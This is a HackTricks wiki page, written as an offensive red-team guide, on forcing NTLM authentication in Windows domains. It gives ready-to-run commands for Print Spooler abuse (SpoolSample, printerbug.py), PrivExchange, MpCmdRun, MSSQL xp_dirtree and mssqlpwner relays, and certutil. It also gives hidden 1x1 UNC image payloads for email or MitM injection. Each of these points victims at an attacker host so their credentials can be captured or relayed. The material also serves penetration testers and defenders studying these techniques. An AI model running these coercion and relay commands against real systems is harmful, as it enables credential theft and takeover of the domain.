# Force NTLM Privileged Authentication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```

### Finding Spooler services listening

Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

### Ask the service to authenticate against an arbitrary host

You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

### Combining with Unconstrained Delegation

If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).

## RCP Force authentication

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.

By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.

## Inside Windows

If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Via email

If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

and when he opens it, he will try to authenticate.

### MitM

If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Cracking NTLMv1

If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

